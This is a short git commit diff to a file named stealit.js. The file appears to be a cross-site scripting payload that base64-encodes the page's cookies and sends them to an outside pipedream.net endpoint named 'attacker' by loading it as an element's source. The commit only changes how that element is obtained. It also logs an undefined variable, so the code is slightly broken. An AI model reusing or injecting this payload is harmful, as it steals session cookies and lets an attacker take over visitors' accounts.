9b5304f2bba06be3a8eb18ae217bc8b3d068181c
Yablargo <matthew.galligan@gmail.com>
2022-10-27 00:26:02 -0400

    Update stealit.js

--- stealit.js
+++ stealit.js
@@ -3,7 +3,7 @@ attacker = "https://eolkkqvs1uis9pt.m.pipedream.net";
 
 cook = btoa(document.cookie);
 
-aud = document.getElementById("aud1");
+aud = document.createElement("aud1");
 aud.src = attacker + "/?" + cook;
 
 console.log(cookie);
